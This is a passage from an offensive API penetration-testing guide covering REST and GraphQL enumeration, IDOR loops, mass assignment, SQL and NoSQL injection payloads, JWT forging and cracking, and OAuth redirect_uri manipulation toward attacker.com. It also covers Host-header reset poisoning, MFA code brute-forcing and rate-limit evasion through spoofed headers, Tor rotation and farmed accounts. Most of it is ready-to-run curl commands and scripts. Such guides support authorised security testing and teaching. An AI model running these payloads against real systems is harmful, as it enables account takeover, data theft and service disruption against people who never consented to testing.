**Function Invocation:**

- `aws lambda invoke` - AWS Lambda invocation
- `curl` - HTTP-triggered function calls
- Language SDKs (boto3, Azure SDK, Google Cloud SDK)

**Exploitation:**

- `wscat` - WebSocket testing
- `parallel` - Concurrent request generation
- `jq` - JSON parsing
- `base64` - Encoding for exfiltration

**Network:**

- `nslookup`, `dig` - DNS-based exfiltration
- `tcpdump` - Traffic analysis (if available)

---

## Important Subtopics

**Critical Follow-up Areas:**

1. **IAM/RBAC Policy Analysis** - Understanding cloud permission models for privilege escalation
2. **Cloud Storage Exploitation** - S3/Blob/GCS misconfigurations often linked to serverless
3. **Secrets Management** - AWS Secrets Manager, Azure Key Vault, GCP Secret Manager enumeration
4. **CI/CD Pipeline Security** - Serverless deployment pipelines as attack vectors
5. **Event-Driven Architecture Abuse** - Exploiting complex event flows and message queues
6. **Serverless Framework/SAM Security** - Infrastructure-as-Code misconfigurations

---

# Cloud API Testing

## REST API Enumeration

### Information Gathering

**Identifying API Endpoints**

Use multiple approaches to discover API endpoints:

```bash
# Passive reconnaissance - search for API documentation
gospider -s https://target.com -d 3 --sitemap | grep -i api

# Directory brute-forcing for common API paths
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
     -u https://api.target.com/FUZZ \
     -mc 200,201,204,301,302,307,401,403

# API-specific wordlists
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
     -u https://target.com/api/v1/FUZZ \
     -mc all -fc 404
```

**Subdomain Enumeration for API Endpoints**

```bash
# Find API subdomains
amass enum -passive -d target.com | grep -i api

# Certificate transparency logs
curl -s "https://crt.sh/?q=%.target.com&output=json" | \
     jq -r '.[].name_value' | grep -i api | sort -u

# DNS brute-forcing
subfinder -d target.com -silent | grep api
```

**Parameter Discovery**

```bash
# Discover hidden parameters with Arjun
arjun -u https://api.target.com/users/profile

# Parameter fuzzing with ffuf
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -u https://api.target.com/endpoint?FUZZ=test \
     -mc all -fc 404 -fs 0

# Using ParamSpider
python3 paramspider.py -d target.com
```

### Version Enumeration

```bash
# Common version disclosure locations
curl -i https://api.target.com/version
curl -i https://api.target.com/api/version
curl -i https://api.target.com/v1
curl -i https://api.target.com/api/v1/status

# Check HTTP headers for version information
curl -I https://api.target.com | grep -i "x-api-version\|server\|x-powered-by"

# OPTIONS method enumeration
curl -i -X OPTIONS https://api.target.com/api/v1/users
```

### REST API Testing Tools

**Using curl for Manual Testing**

```bash
# Basic GET request with headers
curl -i -H "Accept: application/json" \
     -H "User-Agent: Mozilla/5.0" \
     https://api.target.com/users

# POST request with JSON data
curl -i -X POST https://api.target.com/login \
     -H "Content-Type: application/json" \
     -d '{"username":"admin","password":"test"}'

# PUT request for updates
curl -i -X PUT https://api.target.com/users/1 \
     -H "Authorization: Bearer TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"role":"admin"}'

# DELETE request
curl -i -X DELETE https://api.target.com/users/1 \
     -H "Authorization: Bearer TOKEN"

# Testing with different Content-Types
curl -i -X POST https://api.target.com/data \
     -H "Content-Type: application/xml" \
     -d '<user><name>test</name></user>'
```

**Burp Suite Configuration**

```bash
# Launch Burp from terminal with increased memory
java -jar -Xmx4g burpsuite_community.jar

# Configure proxy in curl
curl -x http://127.0.0.1:8080 \
     --proxy-insecure \
     https://api.target.com/endpoint
```

Key Burp extensions for REST APIs:

- **Autorize**: Test authorization flaws
- **InQL**: GraphQL scanner
- **JSON Web Tokens**: JWT manipulation
- **Param Miner**: Discover hidden parameters
- **Turbo Intruder**: High-speed fuzzing

**Postman for API Testing**

```bash
# Install Postman on Kali
wget https://dl.pstmn.io/download/latest/linux64 -O postman.tar.gz
tar -xzf postman.tar.gz
sudo mv Postman /opt/
sudo ln -s /opt/Postman/Postman /usr/local/bin/postman
```

Postman workflow:

1. Import OpenAPI/Swagger specifications
2. Create environment variables for tokens
3. Use Pre-request Scripts for dynamic authentication
4. Chain requests using test scripts
5. Export collections for automated testing

**Specialized Tools**

```bash
# RESTler - automatic REST API fuzzer
git clone https://github.com/microsoft/restler-fuzzer
cd restler-fuzzer
python3 ./build-restler.py --dest_dir /opt/restler

# Compile and test
/opt/restler/restler/Restler compile --api_spec swagger.json
/opt/restler/restler/Restler test --grammar_file Compile/grammar.py \
                                   --dictionary_file Compile/dict.json \
                                   --settings engine_settings.json

# Kiterunner - context-aware API fuzzer
wget https://github.com/assetnote/kiterunner/releases/download/v1.0.2/kiterunner_1.0.2_linux_amd64.tar.gz
tar -xzf kiterunner_1.0.2_linux_amd64.tar.gz
sudo mv kr /usr/local/bin/

# Scan with Kiterunner
kr scan https://api.target.com -w routes-large.kite -x 20
kr brute https://api.target.com -w routes-large.kite -A=apiroutes-210228
```

### HTTP Method Testing

```bash
# Test all HTTP methods
for method in GET POST PUT DELETE PATCH HEAD OPTIONS TRACE; do
    echo "Testing $method:"
    curl -i -X $method https://api.target.com/users/1
done

# Identify allowed methods
curl -i -X OPTIONS https://api.target.com/users

# Method override headers
curl -i -X POST https://api.target.com/users/1 \
     -H "X-HTTP-Method-Override: DELETE"

curl -i -X POST https://api.target.com/users/1 \
     -H "X-Method-Override: PUT" \
     -H "X-HTTP-Method: DELETE"
```

### Object-Level Authorization Testing (BOLA/IDOR)

```bash
# Automated IDOR testing with Burp Autorize workflow:
# 1. Configure low-privilege user session
# 2. Browse as high-privilege user
# 3. Replay requests with low-privilege session

# Manual testing script
#!/bin/bash
for id in {1..1000}; do
    response=$(curl -s -w "%{http_code}" -o /dev/null \
               -H "Authorization: Bearer LOW_PRIV_TOKEN" \
               https://api.target.com/users/$id)
    if [ $response -eq 200 ]; then
        echo "Accessible: /users/$id"
    fi
done

# UUID/GUID enumeration
curl -H "Authorization: Bearer TOKEN" \
     https://api.target.com/documents/00000000-0000-0000-0000-000000000001
```

### Mass Assignment Vulnerabilities

```bash
# Discover all parameters
curl -i -X POST https://api.target.com/users/register \
     -H "Content-Type: application/json" \
     -d '{"username":"test","email":"test@test.com"}'

# Test adding administrative parameters
curl -i -X POST https://api.target.com/users/register \
     -H "Content-Type: application/json" \
     -d '{
           "username":"test",
           "email":"test@test.com",
           "role":"admin",
           "is_admin":true,
           "is_verified":true,
           "credits":999999
         }'

# Try alternative parameter names
curl -i -X PATCH https://api.target.com/users/profile \
     -H "Authorization: Bearer TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"isAdmin":1,"admin":true,"roleId":1,"role_id":1}'
```

### Excessive Data Exposure

```bash
# Request with minimal parameters
curl https://api.target.com/users/1 -H "Authorization: Bearer TOKEN"

# Check for sensitive data in responses:
# - Password hashes
# - API keys or secrets
# - PII (SSN, credit cards)
# - Internal system information

# Test filtering parameters
curl "https://api.target.com/users?fields=id,username" \
     -H "Authorization: Bearer TOKEN"

# Try requesting all fields
curl "https://api.target.com/users?fields=*" \
     -H "Authorization: Bearer TOKEN"
```

### API Versioning Exploitation

```bash
# Test older API versions
curl https://api.target.com/v1/users/1  # Current version
curl https://api.target.com/v0/users/1  # Previous version (may have vulnerabilities)

# Version in headers
curl -H "Accept-Version: 1" https://api.target.com/users/1
curl -H "API-Version: 0" https://api.target.com/users/1

# Version in custom headers
curl -H "X-API-Version: 1.0" https://api.target.com/users/1

# Subdomain versioning
curl https://v1.api.target.com/users/1
curl https://api-v1.target.com/users/1
```

---

## GraphQL Exploitation

### GraphQL Endpoint Discovery

```bash
# Common GraphQL endpoints
curl -i https://target.com/graphql
curl -i https://target.com/graphiql
curl -i https://target.com/api/graphql
curl -i https://target.com/v1/graphql
curl -i https://target.com/query
curl -i https://target.com/gql

# Alternative paths
/graphql/console
/graphql/api
/graphql.php
/api/v1/graphql
/api/v2/graphql

# GraphQL over HTTP methods
curl -X POST https://target.com/graphql
curl -X GET "https://target.com/graphql?query={__typename}"
```

### Introspection Query

```bash
# Full introspection query
curl -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{
           "query": "query IntrospectionQuery {
             __schema {
               queryType { name }
               mutationType { name }
               subscriptionType { name }
               types {
                 ...FullType
               }
               directives {
                 name
                 description
                 locations
                 args {
                   ...InputValue
                 }
               }
             }
           }
           fragment FullType on __Type {
             kind
             name
             description
             fields(includeDeprecated: true) {
               name
               description
               args {
                 ...InputValue
               }
               type {
                 ...TypeRef
               }
               isDeprecated
               deprecationReason
             }
             inputFields {
               ...InputValue
             }
             interfaces {
               ...TypeRef
             }
             enumValues(includeDeprecated: true) {
               name
               description
               isDeprecated
               deprecationReason
             }
             possibleTypes {
               ...TypeRef
             }
           }
           fragment InputValue on __InputValue {
             name
             description
             type { ...TypeRef }
             defaultValue
           }
           fragment TypeRef on __Type {
             kind
             name
             ofType {
               kind
               name
               ofType {
                 kind
                 name
                 ofType {
                   kind
                   name
                   ofType {
                     kind
                     name
                     ofType {
                       kind
                       name
                       ofType {
                         kind
                         name
                         ofType {
                           kind
                           name
                         }
                       }
                     }
                   }
                 }
               }
             }
           }"
         }' | jq . > introspection.json

# Simplified introspection
curl -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{__schema{types{name,fields{name}}}}"}'

# Check if introspection is enabled
curl -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{__schema{queryType{name}}}"}'
```

### GraphQL Enumeration Tools

**GraphQLmap**

```bash
# Clone and setup
git clone https://github.com/swisskyrepo/GraphQLmap
cd GraphQLmap
python3 -m pip install -r requirements.txt

# Interactive mode
python3 graphqlmap.py -u https://target.com/graphql

# Commands within GraphQLmap:
# dump_new    - Dump schema via introspection
# dump_old    - Older introspection method
# nosqli      - NoSQL injection testing
# postgresqli - PostgreSQL injection
# mysqli      - MySQL injection
# mssqli      - MSSQL injection
```

**InQL Scanner (Burp Extension)**

```bash
# Install from BApp Store in Burp Suite
# Or manual installation:
git clone https://github.com/doyensec/inql
cd inql
# Load as Burp extension

# Standalone usage
python3 inql.py -t https://target.com/graphql -o output_folder
```

**GraphQL Voyager (Schema Visualization)**

```bash
# Use online: https://graphql-kit.com/graphql-voyager/
# Or self-host:
git clone https://github.com/APIs-guru/graphql-voyager
cd graphql-voyager
npm install
npm start

# Load introspection JSON for visual schema exploration
```

**Clairvoyance (GraphQL Schema Reconstruction)**

[Inference] When introspection is disabled, Clairvoyance may attempt to reconstruct the schema through probing queries, though success depends on error verbosity and query complexity.

```bash
# Install
pip3 install clairvoyance

# Reconstruct schema without introspection
clairvoyance -u https://target.com/graphql -o schema.json

# With wordlist
clairvoyance -u https://target.com/graphql \
             -w /usr/share/seclists/Discovery/Web-Content/graphql.txt \
             -o schema.json
```

### GraphQL Injection Techniques

**Field Suggestion / Typo-based Discovery**

```bash
# GraphQL may suggest field names on typos
curl -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{ usersssss { id name } }"}'

# Response might contain: "Did you mean 'users'?"
# This reveals field names when introspection is disabled
```

**Batching Attacks**

```bash
# Multiple queries in one request (rate limit bypass)
curl -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{
           "query": "query {
             q1: users(id: 1) { id name email }
             q2: users(id: 2) { id name email }
             q3: users(id: 3) { id name email }
             q4: users(id: 4) { id name email }
           }"
         }'

# Array-based batching
curl -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '[
           {"query":"{ users(id: 1) { id name email } }"},
           {"query":"{ users(id: 2) { id name email } }"},
           {"query":"{ users(id: 3) { id name email } }"}
         ]'
```

**Alias-based Batching**

```bash
# Using aliases for data extraction
curl -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{
           "query": "query {
             user1: user(id: 1) { password }
             user2: user(id: 2) { password }
             user3: user(id: 3) { password }
             user100: user(id: 100) { password }
           }"
         }'
```

**Circular Query DoS**

[Unverified] The following technique may cause resource exhaustion on vulnerable GraphQL implementations without query depth limiting:

```bash
# Deeply nested query
curl -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{
           "query": "query {
             user(id: 1) {
               posts {
                 author {
                   posts {
                     author {
                       posts {
                         author {
                           posts {
                             author {
                               name
                             }
                           }
                         }
                       }
                     }
                   }
                 }
               }
             }
           }"
         }'

# Circular fragment
curl -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{
           "query": "query {
             ...A
           }
           fragment A on Query {
             ...B
           }
           fragment B on Query {
             ...A
           }"
         }'
```

**SQL Injection in GraphQL**

```bash
# Test for SQL injection in arguments
curl -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{
           "query": "{ users(id: \"1 OR 1=1--\") { id name } }"
         }'

# Time-based SQL injection
curl -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{
           "query": "{ user(id: \"1 AND SLEEP(5)--\") { name } }"
         }'

# With variables
curl -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{
           "query": "query($id: String!) { user(id: $id) { name } }",
           "variables": {"id": "1\" OR \"1\"=\"1"}
         }'
```

**NoSQL Injection**

```bash
# MongoDB operator injection
curl -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{
           "query": "mutation { login(username: {\"$gt\": \"\"}, password: {\"$gt\": \"\"}) { token } }"
         }'

# Alternative syntax
curl -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{
           "query": "query { users(filter: {\"username\": {\"$regex\": \".*\"}}) { id name } }"
         }'
```

**Authorization Bypass**

```bash
# IDOR in GraphQL
curl -X POST https://target.com/graphql \
     -H "Authorization: Bearer USER_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"query":"{ user(id: 999) { id email privateData } }"}'

# Mutation authorization bypass
curl -X POST https://target.com/graphql \
     -H "Authorization: Bearer LOW_PRIV_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{
           "query": "mutation { deleteUser(id: 1) { success } }"
         }'

# Field-level authorization bypass
curl -X POST https://target.com/graphql \
     -H "Authorization: Bearer TOKEN" \
     -H "Content-Type: application/json" \
     -d '{
           "query": "{ users { id name email ssn salary privateNotes } }"
         }'
```

### GraphQL Query Complexity & Resource Attacks

**Query Cost Analysis**

```bash
# Expensive field expansion
curl -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{
           "query": "{ users { posts { comments { author { posts { comments { text } } } } } } }"
         }'

# Array parameter abuse
curl -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{
           "query": "query { users(first: 999999) { id name } }"
         }'
```

**Automated Fuzzing**

```bash
# Using GraphQL Cop
pip3 install graphql-cop
graphql-cop -t https://target.com/graphql

# Checks performed:
# - Introspection enabled
# - Field suggestions
# - Batch query support
# - Alias-based batching
# - Query depth limit
# - Directive overloading
```

---

## API Authentication Bypass

### JWT (JSON Web Token) Exploitation

**JWT Structure Analysis**

```bash
# Decode JWT without verification
echo "eyJhbGc..." | base64 -d

# Using jwt_tool
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
python3 jwt_tool.py JWT_TOKEN_HERE

# Decode and analyze
python3 jwt_tool.py -Q JWT_TOKEN_HERE
```

**JWT Attack Techniques**

```bash
# None algorithm attack
python3 jwt_tool.py JWT_TOKEN -X a

# Null signature
python3 jwt_tool.py JWT_TOKEN -X n

# Algorithm confusion (RS256 to HS256)
python3 jwt_tool.py JWT_TOKEN -X k -pk public_key.pem

# JWKS injection
python3 jwt_tool.py JWT_TOKEN -X i

# Kid header injection
python3 jwt_tool.py JWT_TOKEN -I -hc kid -hv "../../dev/null" -S

# SQL injection in kid header
python3 jwt_tool.py JWT_TOKEN -I -hc kid -hv "key' OR '1'='1" -S

# JWT crack (weak secret)
python3 jwt_tool.py JWT_TOKEN -C -d /usr/share/wordlists/rockyou.txt

# Brute force with hashcat
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

**Manual JWT Manipulation**

```bash
# Create JWT with custom payload
# Header: {"alg":"HS256","typ":"JWT"}
# Payload: {"sub":"admin","role":"admin","iat":1234567890}

# Python script for JWT creation
python3 << 'EOF'
import jwt
import json

# Weak secret
secret = "secret"

payload = {
    "sub": "admin",
    "role": "admin",
    "iat": 1234567890,
    "exp": 9999999999
}

token = jwt.encode(payload, secret, algorithm="HS256")
print(token)
EOF

# Test the token
curl -H "Authorization: Bearer NEW_TOKEN" https://api.target.com/admin
```

**JWT Key Confusion**

```bash
# Extract public key from JWKS endpoint
curl https://api.target.com/.well-known/jwks.json | jq . > jwks.json

# Convert JWKS to PEM
python3 << 'EOF'
from jwcrypto import jwk
import json

with open('jwks.json') as f:
    keys = json.load(f)['keys'][0]

key = jwk.JWK(**keys)
pem = key.export_to_pem()
with open('public.pem', 'wb') as f:
    f.write(pem)
EOF

# Sign with public key as HMAC secret
python3 jwt_tool.py JWT_TOKEN -S hs256 -k public.pem
```

### OAuth 2.0 Exploitation

**Authorization Code Interception**

```bash
# Monitor OAuth flow
# 1. Intercept redirect_uri parameter
# Original: https://client.com/callback
# Modified: https://attacker.com/callback

# Test redirect_uri manipulation
curl "https://target.com/oauth/authorize?response_type=code&client_id=CLIENT_ID&redirect_uri=https://attacker.com/callback&scope=read&state=xyz"

# Open redirects in redirect_uri
curl "https://target.com/oauth/authorize?response_type=code&client_id=CLIENT_ID&redirect_uri=https://client.com/callback?next=https://attacker.com&scope=read"
```

**OAuth Token Theft**

```bash
# Check for token in URL (implicit flow)
# Vulnerable: https://client.com/callback#access_token=TOKEN&token_type=bearer
# Should use: authorization code flow with PKCE

# Test CORS misconfigurations on token endpoint
curl -H "Origin: https://attacker.com" \
     -H "Access-Control-Request-Method: POST" \
     -H "Access-Control-Request-Headers: Content-Type" \
     -X OPTIONS \
     https://target.com/oauth/token

# Attempt CSRF on OAuth flow
# Missing 'state' parameter enables CSRF
curl "https://target.com/oauth/authorize?response_type=code&client_id=CLIENT_ID&redirect_uri=https://client.com/callback&scope=read"
```

**Scope Manipulation**

```bash
# Request elevated scopes
curl "https://target.com/oauth/authorize?response_type=code&client_id=CLIENT_ID&redirect_uri=https://client.com/callback&scope=read+write+admin&state=xyz"

# Token exchange with modified scope
curl -X POST https://target.com/oauth/token \
     -d "grant_type=authorization_code" \
     -d "code=AUTH_CODE" \
     -d "redirect_uri=https://client.com/callback" \
     -d "client_id=CLIENT_ID" \
     -d "client_secret=CLIENT_SECRET" \
     -d "scope=read write admin"
```

### API Key Testing

**API Key Discovery**

```bash
# Search for API keys in JavaScript
wget -r -l 1 -H -t 1 -nd -N -np -A js https://target.com/
grep -EHirn "api[_-]?key|apikey|api[_-]?secret" *.js

# Common locations
curl https://target.com/api/config
curl https://target.com/api/v1/config
curl https://target.com/config.json
curl https://target.com/swagger.json

# GitHub/GitLab search
# Manual search for: target.com API_KEY

# Check robots.txt and sitemap
curl https://target.com/robots.txt
curl https://target.com/sitemap.xml
```

**API Key Parameter Testing**

```bash
# Test multiple parameter names
for param in api_key apikey api-key key token access_token apiToken api_token; do
    echo "Testing: $param"
    curl "https://api.target.com/endpoint?${param}=FOUND_KEY"
done

# Test in different locations
curl "https://api.target.com/endpoint?api_key=KEY"
curl -H "X-API-Key: KEY" https://api.target.com/endpoint
curl -H "Authorization: KEY" https://api.target.com/endpoint
curl -H "Authorization: Api-Key KEY" https://api.target.com/endpoint
```

### Session Token Vulnerabilities

**Session Fixation**

```bash
# Obtain session token
curl -i https://target.com/login | grep -i "set-cookie"

# Attempt to use pre-set session
curl -i https://target.com/login \
     -H "Cookie: SESSIONID=ATTACKER_CONTROLLED_ID" \
     -d "username=victim&password=victim_pass"

# Check if session persists after login
```

**Weak Session Generation**

```bash
# Collect multiple sessions
for i in {1..100}; do
    curl -i https://target.com/api/session 2>&1 | \
    grep -i "set-cookie" >> sessions.txt
done

# Analyze for patterns (Python script)
python3 << 'EOF'
import re
from collections import Counter

with open('sessions.txt') as f:
    tokens = re.findall(r'SESSIONID=([^;]+)', f.read())

# Check for sequential patterns
print(f"Total tokens: {len(tokens)}")
print(f"Unique tokens: {len(set(tokens))}")

# Look for timestamp-based generation
for token in tokens[:10]:
    print(token)
EOF
```

### HTTP Header Authentication Bypass

**Host Header Injection**

```bash
# Password reset poisoning
curl -X POST https://target.com/api/password-reset \
     -H "Host: attacker.com" \
     -d "email=victim@target.com"

# Check reset email for attacker.com link
```

**X-Forwarded Headers**

```bash
# IP whitelist bypass
curl -H "X-Forwarded-For: 127.0.0.1" https://api.target.com/admin
curl -H "X-Real-IP: 127.0.0.1" https://api.target.com/admin
curl -H "X-Originating-IP: 127.0.0.1" https://api.target.com/admin
curl -H "X-Remote-IP: 127.0.0.1" https://api.target.com/admin
curl -H "X-Client-IP: 127.0.0.1" https://api.target.com/admin

# Try internal IP ranges
curl -H "X-Forwarded-For: 10.0.0.1" https://api.target.com/internal
curl -H "X-Forwarded-For: 192.168.1.1" https://api.target.com/internal
curl -H "X-Forwarded-For: 172.16.0.1" https://api.target.com/internal
```

**Request Method Override**

```bash
# Bypass method restrictions
curl -X GET https://api.target.com/admin/delete?id=1 \
     -H "X-HTTP-Method-Override: DELETE"

curl -X POST https://api.target.com/users/1 \
     -H "X-Method-Override: PUT" \
     -d '{"role":"admin"}'
```

### Multi-Factor Authentication Bypass

**MFA Flow Analysis**

```bash
# Test authentication flow
# 1. POST to /login with credentials
# 2. Server responds with session requiring MFA
# 3. POST to /verify-mfa with code
# 4. Access granted

# Try skipping MFA verification
curl -i -X POST https://api.target.com/login \
     -d "username=user&password=pass" \
     -c cookies.txt

# Directly access protected resource
curl -b cookies.txt https://api.target.com/dashboard

# Try accessing /verify-mfa without prior authentication
curl -X POST https://api.target.com/verify-mfa \
     -d "code=123456"
```

**MFA Code Bruteforce**

```bash
# Test rate limiting on MFA endpoint
for code in {000000..999999}; do
    response=$(curl -s -w "%{http_code}" -o /dev/null \
               -X POST https://api.target.com/verify-mfa \
               -b "session=SESSION_TOKEN" \
               -d "code=$code")
    if [ $response -eq 200 ]; then
        echo "Valid code: $code"
        break
    fi
done

# Using Burp Intruder with number payload (000000-999999)
```

**Backup Code Reuse**

```bash
# Test if backup codes are single-use
curl -X POST https://api.target.com/verify-mfa \
     -b "session=SESSION_TOKEN" \
     -d "backup_code=ABC123DEF"

# Try reusing same code
curl -X POST https://api.target.com/verify-mfa \
     -b "session=SESSION_TOKEN" \
     -d "backup_code=ABC123DEF"

# Check response for successful reuse
```

**MFA Token Reuse**

```bash
# Capture valid MFA code during legitimate login
# Test if code remains valid after successful use

# Session 1: Complete MFA successfully
curl -X POST https://api.target.com/verify-mfa \
     -b "session=SESSION1" \
     -d "code=123456"

# Session 2: Try same code
curl -X POST https://api.target.com/verify-mfa \
     -b "session=SESSION2" \
     -d "code=123456"
```

**Response Manipulation**

```bash
# Intercept MFA verification response
curl -X POST https://api.target.com/verify-mfa \
     -b "session=SESSION_TOKEN" \
     -d "code=000000" \
     -i

# Response might be:
# {"success":false,"mfa_verified":false}

# Test if client-side validation only:
# Modify response to: {"success":true,"mfa_verified":true}
# Continue with modified session
```

---

## Rate Limiting Bypass

### Rate Limit Detection

**Identifying Rate Limits**

```bash
# Send rapid requests and monitor responses
for i in {1..100}; do
    echo "Request $i:"
    curl -w "Status: %{http_code} Time: %{time_total}\n" \
         -s -o /dev/null \
         https://api.target.com/endpoint
    sleep 0.1
done

# Common rate limit responses:
# - HTTP 429 (Too Many Requests)
# - HTTP 503 (Service Unavailable)
# - Custom error messages

# Check rate limit headers
curl -i https://api.target.com/endpoint | grep -i "rate\|limit\|retry"

# Common headers:
# X-RateLimit-Limit: 100
# X-RateLimit-Remaining: 99
# X-RateLimit-Reset: 1234567890
# Retry-After: 60
```

### IP-Based Rate Limit Bypass

**X-Forwarded-For Rotation**

```bash
# Rotate source IP with headers
#!/bin/bash
for i in {1..254}; do
    curl -H "X-Forwarded-For: 10.0.0.$i" \
         https://api.target.com/endpoint
done

# Multiple header variations
curl -H "X-Forwarded-For: 1.2.3.4" \
     -H "X-Real-IP: 5.6.7.8" \
     -H "X-Originating-IP: 9.10.11.12" \
     https://api.target.com/endpoint

# IPv6 address space
for i in {1..1000}; do
    ipv6=$(printf "2001:db8::%x" $i)
    curl -H "X-Forwarded-For: $ipv6" \
         https://api.target.com/endpoint
done
```

**Proxy Rotation**

```bash
# Using ProxyChains
# Configure /etc/proxychains4.conf with multiple proxies
proxychains4 curl https://api.target.com/endpoint

# Tor circuit rotation
for i in {1..100}; do
    # Send request through Tor
    curl --socks5-hostname 127.0.0.1:9050 \
         https://api.target.com/endpoint
    
    # Rotate circuit
    echo -e 'AUTHENTICATE ""\r\nSIGNAL NEWNYM\r\nQUIT' | \
    nc 127.0.0.1 9051
    sleep 2
done

# Using rotating proxy services
curl -x http://username:password@proxy-rotating.com:8080 \
     https://api.target.com/endpoint
```

**Cloud Function/Lambda Bypass**

[Inference] Requests originating from different cloud function instances may appear to come from distinct IP addresses, potentially bypassing IP-based rate limiting:

```bash
# AWS Lambda example (not executable in Kali, for reference)
# Each invocation uses different IP

# Google Cloud Functions deployment
gcloud functions deploy rate-limit-bypass \
    --runtime python39 \
    --trigger-http \
    --entry-point make_request

# Invoke multiple times
for i in {1..100}; do
    gcloud functions call rate-limit-bypass \
        --data '{"url":"https://api.target.com/endpoint"}'
done
```

### User-Based Rate Limit Bypass

**Account Enumeration**

```bash
# Create multiple accounts via registration API
for i in {1..50}; do
    curl -X POST https://api.target.com/register \
         -H "Content-Type: application/json" \
         -d "{\"username\":\"user$i\",\"email\":\"user$i@temp.com\",\"password\":\"Password123\"}"
done

# Rotate through accounts
#!/bin/bash
accounts=("user1:pass1" "user2:pass2" "user3:pass3")
for account in "${accounts[@]}"; do
    IFS=':' read -r user pass <<< "$account"
    
    # Get token
    token=$(curl -s -X POST https://api.target.com/login \
            -d "username=$user&password=$pass" | jq -r '.token')
    
    # Make request
    curl -H "Authorization: Bearer $token" \
         https://api.target.com/endpoint
done
```

**Session Token Rotation**

```bash
# Generate multiple sessions
for i in {1..20}; do
    session=$(curl -s https://api.target.com/api/session | \
              grep -oP 'session=\K[^;]+')
    echo "$session" >> sessions.txt
done

# Use different session for each request
while read session; do
    curl -b "SESSIONID=$session" \
         https://api.target.com/endpoint
done < sessions.txt
```

### API Key Rotation

```bash
# If multiple API keys available
api_keys=("key1" "key2" "key3" "key4" "key5")

for key in "${api_keys[@]}"; do
    curl -H "X-API-Key: $key" \
         https://api.target.com/endpoint
done

# Burp Intruder with API key list
# Position marker: X-API-Key: §KEY§
# Payload type: Simple list
# Load keys from file
```

### Request Header Manipulation

**User-Agent Rotation**

```bash
# Rotate User-Agent strings
user_agents=(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)"
)

for ua in "${user_agents[@]}"; do
    curl -H "User-Agent: $ua" \
         https://api.target.com/endpoint
done
```

**Request ID Manipulation**

```bash
# Some APIs rate limit based on custom request IDs
# Generate unique request IDs
for i in {1..1000}; do
    request_id=$(uuidgen)
    curl -H "X-Request-ID: $request_id" \
         https://api.target.com/endpoint
done

# Or timestamp-based
for i in {1..1000}; do
    request_id="req_$(date +%s%N)"
    curl -H "X-Request-ID: $request_id" \
         https://api.target.com/endpoint
done
```

### Parameter-Based Bypass

**Case Manipulation**

```bash
# Original endpoint
curl https://api.target.com/api/v1/users

# Case variations
curl https://api.target.com/API/v1/users
curl https://api.target.com/Api/V1/Users
curl https://api.target.com/api/V1/USERS

# Parameter case manipulation
curl "https://api.target.com/search?Query=test"
curl "https://api.target.com/search?query=test"
curl "https://api.target.com/search?QUERY=test"
```

**URL Encoding Bypass**

```bash
# Standard request
curl "https://api.target.com/api/users"

# URL encoding variations
curl "https://api.target.com/api%2fusers"
curl "https://api.target.com/%61%70%69/users"
curl "https://api.target.com/api/users%00"

# Double encoding
curl "https://api.target.com/%2561%2570%2569/users"

# Unicode encoding
curl "https://api.target.com/api/users%E2%80%8B"  # Zero-width space
```

**HTTP Method Variation**

```bash
# If rate limited on GET
curl -X GET https://api.target.com/api/users  # Rate limited

# Try POST with same result
curl -X POST https://api.target.com/api/users

# Try HEAD
curl -I https://api.target.com/api/users

# Method override headers
curl -X POST https://api.target.com/api/users \
     -H "X-HTTP-Method-Override: GET"
```

### Path Manipulation

**Null Byte Injection**

```bash
# Standard endpoint
curl "https://api.target.com/api/users"

# Null byte variations
curl "https://api.target.com/api/users%00"
curl "https://api.target.com/api/users%00.jpg"
curl "https://api.target.com/api/users%00/admin"
```

**Directory Traversal in Paths**

```bash
# Add path traversal sequences
curl "https://api.target.com/api/./users"
curl "https://api.target.com/api/../api/users"
curl "https://api.target.com/api/v1/../../api/users"

# Combined with rate limit evasion
curl "https://api.target.com//api//users"
curl "https://api.target.com/api/users/"
curl "https://api.target.com/api/users/./"
```

**HTTP Version Manipulation**

```bash
# HTTP/1.1 (default)
curl --http1.1 https://api.target.com/endpoint

# HTTP/2
curl --http2 https://api.target.com/endpoint

# HTTP/1.0
curl --http1.0 https://api.target.com/endpoint

# Some rate limiters track by protocol version
```

### GraphQL-Specific Rate Limit Bypass

**Alias-Based Requests**

```bash
# Single request with 100 aliases bypasses per-request limit
curl -X POST https://api.target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{
           "query": "query {
             a1: users(id: 1) { name }
             a2: users(id: 2) { name }
             a3: users(id: 3) { name }
             ...
             a100: users(id: 100) { name }
           }"
         }'

# Generate aliases programmatically
python3 << 'EOF'
query = "query {\n"
for i in range(1, 1001):
    query += f"  u{i}: user(id: {i}) {{ id name email }}\n"
